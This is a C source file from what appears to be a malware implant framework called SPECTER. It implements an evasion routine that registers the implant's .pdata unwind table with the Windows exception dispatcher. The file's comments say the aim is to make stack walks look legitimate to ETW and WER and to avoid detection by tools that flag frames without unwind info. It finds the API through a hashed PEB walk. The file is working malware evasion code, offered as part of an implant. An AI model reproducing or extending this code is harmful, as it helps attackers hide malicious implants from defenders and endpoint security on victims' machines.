/**
 * SPECTER Implant — .pdata Registration
 *
 * Registers the implant's RUNTIME_FUNCTION table with the Windows
 * exception dispatcher via RtlAddFunctionTable.  This allows the OS
 * to properly unwind through implant stack frames, which:
 *   1. Prevents crashes from unhandled exceptions in implant code
 *   2. Makes stack walks from ETW/WER look legitimate
 *   3. Avoids detection by tools that flag frames without unwind info
 *
 * The RUNTIME_FUNCTION array is emitted by the compiler into .pdata
 * and kept in the PIC blob via linker symbols __pdata_start/__pdata_end.
 * RtlAddFunctionTable is resolved from ntdll via PEB walk (not a
 * syscall — it's a regular user-mode API).
 */

#include "specter.h"
#include "ntdefs.h"
#include "evasion.h"
#include "peb.h"

/* ------------------------------------------------------------------ */
/*  DJB2 hash for RtlAddFunctionTable                                  */
/* ------------------------------------------------------------------ */

#define HASH_RTLADDFUNCTIONTABLE  0xE0C3DCE6

/* ------------------------------------------------------------------ */
/*  Linker-provided symbols for .pdata boundaries                      */
/* ------------------------------------------------------------------ */

extern BYTE __pdata_start[];
extern BYTE __pdata_end[];
extern BYTE __xdata_start[];
extern BYTE __xdata_end[];

/* ------------------------------------------------------------------ */
/*  RtlAddFunctionTable function pointer typedef                       */
/* ------------------------------------------------------------------ */

typedef BOOL (__attribute__((ms_abi)) *fn_RtlAddFunctionTable)(
    PRUNTIME_FUNCTION FunctionTable,
    DWORD             EntryCount,
    QWORD             BaseAddress
);

/* ------------------------------------------------------------------ */
/*  evasion_register_pdata                                              */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_register_pdata(EVASION_CONTEXT *ctx, PVOID implant_base) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    /* Calculate .pdata extent from linker symbols */
    PBYTE pdata_begin = __pdata_start;
    PBYTE pdata_end_p = __pdata_end;

    if (pdata_begin >= pdata_end_p)
        return STATUS_NOT_FOUND;  /* No .pdata entries emitted */

    SIZE_T pdata_size = (SIZE_T)(pdata_end_p - pdata_begin);
    DWORD entry_count = (DWORD)(pdata_size / sizeof(RUNTIME_FUNCTION));

    if (entry_count == 0)
        return STATUS_NOT_FOUND;

    /* Resolve RtlAddFunctionTable from ntdll via PEB walk.
       This is a regular user-mode API, not a syscall. */
    PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll_base)
        return STATUS_PROCEDURE_NOT_FOUND;

    fn_RtlAddFunctionTable pRtlAddFunctionTable =
        (fn_RtlAddFunctionTable)find_export_by_hash(
            ntdll_base, HASH_RTLADDFUNCTIONTABLE);

    if (!pRtlAddFunctionTable)
        return STATUS_PROCEDURE_NOT_FOUND;

    /* The BaseAddress parameter must be the base of the "image" that
       contains the functions described by the RUNTIME_FUNCTION entries.
       For our PIC blob, this is the implant's base address.  The
       BeginAddress/EndAddress fields in each RUNTIME_FUNCTION are RVAs
       relative to this base. */
    QWORD base_addr = (QWORD)(ULONG_PTR)implant_base;

    BOOL ok = pRtlAddFunctionTable(
        (PRUNTIME_FUNCTION)pdata_begin,
        entry_count,
        base_addr
    );

    if (!ok)
        return STATUS_UNSUCCESSFUL;

    /* Store registration info in evasion context for potential
       cleanup via RtlDeleteFunctionTable later */
    ctx->pdata_table = (PVOID)pdata_begin;
    ctx->pdata_count = entry_count;

    return STATUS_SUCCESS;
}
